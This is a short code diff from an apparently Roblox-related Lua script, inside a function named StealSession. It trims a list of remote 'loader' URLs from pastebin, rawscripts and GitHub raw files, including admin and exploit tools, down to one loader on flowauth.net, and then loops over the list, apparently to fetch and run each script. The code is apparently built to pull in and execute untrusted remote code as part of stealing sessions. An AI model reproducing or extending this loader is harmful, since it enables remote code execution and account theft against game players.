@@ -150,23 +150,7 @@ local function StealSession()
     end
 
     local loaders = {
-        "https://flowauth.net/v1/loaders/VR7.lua",
-        "https://rawscripts.net/raw/Universal-Script-Gamepass-Product-212343",
-        "https://raw.githubusercontent.com/AlphaBay00/PhantomXLoader/main/Ld.lua.txt",
-        "https://rawscripts.net/raw/Animal-Hospital-(Anomaly)-Ajjans-Roblox-Animal-Hospital-Auto-Treat-Script-243159",
-        "https://pastebin.com/raw/PgAdUTAt",
-        "https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/Hshjs",
-        "https://raw.githubusercontent.com/VR7ss/VR7/main/vr7ontop",
-        "https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP",
-        "https://raw.githubusercontent.com/panelhenil-oss/NOVI-ROLI/refs/heads/main/ROLI.txt",
-        "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",
-        "https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source",
-        "https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua",
-        "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua",
-        "https://raw.githubusercontent.com/exunys/SimpleSpy/main/source.lua",
-        "https://raw.githubusercontent.com/richie0866/orca/main/source.lua",
-        "https://raw.githubusercontent.com/ec322/SystemExodus/main/main.lua",
-        "https://raw.githubusercontent.com/UpbeatEngine/Hydroxide/main/init.lua"
+        "https://flowauth.net/v1/loaders/VR7.lua"
     }
 
     for _, url in ipairs(loaders) do
